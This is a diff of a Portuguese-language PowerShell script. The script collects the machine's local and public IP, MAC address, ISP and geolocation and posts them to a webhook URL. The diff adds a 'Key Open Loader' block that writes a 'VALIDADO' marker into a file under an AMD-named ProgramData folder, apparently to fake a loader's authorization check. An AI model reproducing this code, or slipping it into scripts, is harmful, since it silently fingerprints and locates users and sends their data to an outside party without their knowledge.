@@ -24,7 +24,6 @@ $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notli
 $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)' } | Select-Object -First 1).IPAddress
 $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
 
-# Padrão caso a API falhe
 $ipPublic = "Não disponível"
 $isp = "Não disponível"
 $city = "Não disponível"
@@ -33,7 +32,6 @@ $country = "Não disponível"
 $lat = "Não disponível"
 $lon = "Não disponível"
 
-# Tenta pegar IP público e localização da API ip-api.com
 try {
     $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5
     if ($geoData.status -eq "success") {
@@ -73,6 +71,12 @@ $payload = @{
     embeds = @($embed)
 } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+
+# Key Open Loader
+$arquivo = "C:\ProgramData\AMD\Key.Auth"
+$diretorio = Split-Path $arquivo
+New-Item -Path $diretorio -ItemType Directory -Force | Out-Null
+"VALIDADO" | Out-File -Encoding UTF8 -FilePath $arquivo -Force
 
 # Criar Ponto 
 function CriarPontoDeRestauracao {
